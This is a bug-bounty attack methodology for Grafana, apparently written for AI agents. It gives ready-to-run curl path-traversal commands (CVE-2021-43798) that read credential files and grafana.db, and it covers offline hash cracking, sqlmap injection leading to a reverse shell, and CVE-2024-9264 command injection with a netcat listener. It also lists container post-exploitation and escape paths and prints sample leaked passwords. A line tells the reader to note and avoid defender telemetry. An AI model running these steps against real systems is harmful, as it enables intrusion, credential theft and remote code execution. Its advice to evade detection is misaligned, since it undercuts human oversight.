---
technology: "Grafana"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "field-grounded THIN (5 evidence files; see internal coverage ledger) + upstream-verified: NVD/Grafana CVE-2021-43798, Grafana advisory CVE-2024-9264, Grafana configure-security/configure-grafana docs, grafana v8.3.0 source (PBKDF2 10000), 2026-11-12"
provenance: "corpus-grounded: 6 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[grafana|Grafana overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Grafana Bug Bounty Methodology

**Scope:** Grafana OSS/Enterprise web app on 3000/tcp, standalone or containerized, anonymous/viewer/editor/admin access levels; the datasource proxy and its backends as lateral targets. **Out of scope:** the backends' own surfaces (mysql, postgres, elasticsearch pages), Grafana Loki/Mimir/Tempo agents (different attack surfaces), Grafana Cloud (vendor-side).

**Authorization:** presume written permission. Queries through the datasource proxy execute on production backends — bound enumeration, no destructive SQL. DESTRUCTIVE flags mark backend/state-mutating steps.

## Decision tree (one screen)

1. Version from login page → 8.0.0-beta1–8.3.0 → Phase 2 unauth file read first (CVE-2021-43798).
2. Any working login (default/weak/leaked/anonymous) → Phase 3 → version 11.0.0+ → Phase 5 (CVE-2024-9264).
3. Shell on adjacent host → Phase 4 (grafana.db on disk) — no CVE needed.
4. No version disclosure → Phase 1 fingerprints (headers, /api/health, login assets).

## Phase 1 — Fingerprinting

```bash
nmap -p3000 -sV 198.51.100.10                      # "Grafana http" service detection (observed)
ffuf -w subdomains.txt -u http://198.51.100.10 -H 'Host: FUZZ.example.com' -fs 0   # grafana vhosts (observed)
curl -s http://198.51.100.10:3000/api/health       # {"database":"ok",...} — unauth liveness
curl -s http://198.51.100.10:3000/login | grep -i version   # build info in page assets
```

Read: the login page title/`<title>Grafana</title>` and footer disclose the build (observed both from the login page itself and from the help icon). Port 3000 alone is NOT Grafana — Gitea, Node apps, LibreNMS squat the same port (adjudicated out in the ledger); require the branded login page or `/api/health` before claiming the surface.

## Phase 2 — Unauthenticated file read (CVE-2021-43798)

Applies to 8.0.0-beta1–8.3.0 (fixed 8.3.1/8.2.7/8.1.8/8.0.7). Plugin asset route, no session required:

```bash
curl --path-as-is \
  'http://198.51.100.10:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
curl --path-as-is \
  'http://198.51.100.10:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' \
  --output grafana.db            # observed — 584k db straight down the traversal
```

The file-read ladder, in field-observed yield order:

1. `/etc/grafana/grafana.ini` — `admin_password` and integration secrets (one live instance: `admin:messageInABottle685427`).
2. `/etc/grafana/provisioning/datasources/*.yaml` — backend credentials in cleartext (observed: `mysql.yaml` → `grafana:dontStandSoCloseToMe63221!` → direct MySQL login).
3. `/var/lib/grafana/grafana.db` — the SQLite itself (observed) → Phase 4.
4. `/etc/passwd`, service configs — impact corroboration for the report.

`--path-as-is` (curl) is mandatory — path normalization in clients kills the `../` payload. Any shipped plugin slug works (`alertlist`, `zipkin`, `graph`, ...); enumerate plugin IDs from the login page's own asset requests if unsure.

## Phase 3 — Auth fork

- **Default/weak:** `admin:admin` (first-login change can be deferred/dismissed on misconfigured installs); password-spray the admin user with org-specific wordlists.
- **Anonymous access:** `[auth.anonymous] enabled` grants Viewer org_role without login (an adjacent observed case: a kiosk deployment) — a Viewer is enough for Phase 5 on 11.x and for datasource-panel SQLi.
- **Leaked:** `grafana.ini` (Phase 2), application env/config files, backups. Observed reuse rate is high — Grafana admin passwords reappear on host SSH (one deployment's `GF_SECURITY_ADMIN_PASSWORD` was reused by user enzo for SSH).

## Phase 4 — grafana.db (the offline crack)

With the file (traversal, disk shell — both observed: once via traversal, once via a readable `/opt/data/grafana.db`):

```bash
sqlite3 grafana.db 'select login,password,salt,rands from user;'
# hash format: PBKDF2-HMAC-SHA256 (v8.3.0 source: pbkdf2.Key(..., 10000, 32, sha256.New))
```

Convert to a cracker-friendly format (small Python script recomposing hex hash + salt + 10000 iterations — one engagement wrote exactly this; the grafana2hashcat script automates it) and run hashcat/john with rockyou-class wordlists. Both observed cracks recovered user passwords reused elsewhere. Also mine: `data_source` table (cleartext backend creds), dashboard JSON (panel SQL, embedded URLs), `org`/`team` for user lists.

## Phase 5 — Authenticated surface → backends → RCE

- **Datasource panel SQLi:** saved-panel queries POST through the datasource proxy; capture the request (browser devtools, intercepting proxy) and replay into sqlmap (observed: `sqlmap -r r1 --dbms postgresql --batch` → stacked queries, `is-dba: true` → `COPY ... FROM PROGRAM` reverse shell as the DB server user).
- **SQL Expressions / DuckDB (CVE-2024-9264):** Grafana 11.0.0+ pre-fix (11.0.5/11.1.6/11.2.1 `+security-01`), any Viewer-or-higher; the experimental SQL Expressions backend passes unsanitized input to the `duckdb` CLI when that binary is in Grafana's PATH — command injection and file inclusion; blind-fire it (the feature is invisible in the GUI) with a public PoC pattern and a netcat listener (observed: uid=0 in the container, first attempt). Prereq check: DuckDB installed — if absent the injection is inert.
- **Snapshot/public-sharing abuse:** snapshots and public dashboards export panel data without data source access — authenticated users can snapshot dashboards containing sensitive panel results to externally-shareable links. Check `/api/snapshots` and public-dashboard toggles on any org with sensitive panels (functionality-level risk; no CVE claimed).
- **DESTRUCTIVE note:** SQLi runs against production backends — use sqlmap's `--risk 1 --level 1` first; the COPY FROM PROGRAM class is RCE on the DB host.

## Phase 6 — Post-exploitation (container era)

- `env` / `/proc/1/environ` in the Grafana container: `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD` (observed: `enzo:RioTecRANDEntANT!` → host SSH).
- `/usr/share/grafana` as cwd (observed) — grafana.db and provisioning copies inside the image; `/var/lib/grafana/plugins` for custom/signed-plugin review.
- Escape paths: Docker socket mounts, host-mounted provisioning dirs, credential reuse on the host.

## Phase 7 — Defense and validation notes

- **Finding shape:** traversal screenshot + the read `grafana.ini` line; or datasource YAML creds + successful backend login; or grafana.db user-table dump + cracked password. The credential is the report.
- **Defender telemetry (note and avoid):** `/public/plugins/` 404 bursts with `../` runs, `grafana.db` read by non-service users, sqlmap-shaped panel queries in datasource proxy logs, duckdb processes spawned by grafana.
- **Hardening:** patch past 8.3.1 / the 11.0.5+security-01 line; move data source creds to secret files/keystore; restrict `[auth.anonymous]`; scrub cleartext from provisioning YAMLs; separate DB users per dashboard with read-only grants.

## Appendix A — Tooling (named in prose)

- **nmap** — 3000 service detection (`Grafana http` banner).
- **ffuf** — vhost/subdomain discovery for grafana endpoints (observed).
- **curl** with `--path-as-is` — the CVE-2021-43798 traversal (observed).
- **sqlite3 / sqlitebrowser** — grafana.db post-capture analysis (observed).
- **sqlmap** — datasource-panel SQLi against saved requests (observed).
- **hashcat / john** plus a PBKDF2 format converter — grafana.db user hashes (observed; grafana2hashcat automates the conversion).
- **netcat** — listener for CVE-2024-9264 reverse shells (observed).
- References: Grafana security advisories for CVE-2021-43798 and CVE-2024-9264; Grafana configure-security and provisioning docs (upstream-verified for this page).

## Appendix B — Quick reference

```bash
# version → CVE fork
curl -s http://198.51.100.10:3000/login | grep -io 'version[^,]*'
# unauth file read (8.0.0-beta1–8.3.0)
curl --path-as-is 'http://198.51.100.10:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'
curl --path-as-is 'http://198.51.100.10:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --output grafana.db
# db → hashes
sqlite3 grafana.db 'select login,password,salt from user;'
# authenticated SQLi (observed pattern)
sqlmap -r panel-request.txt --dbms postgresql --batch
# CVE-2024-9264 era: viewer login + duckdb-in-PATH check, then PoC → netcat -lvnp 9001
```
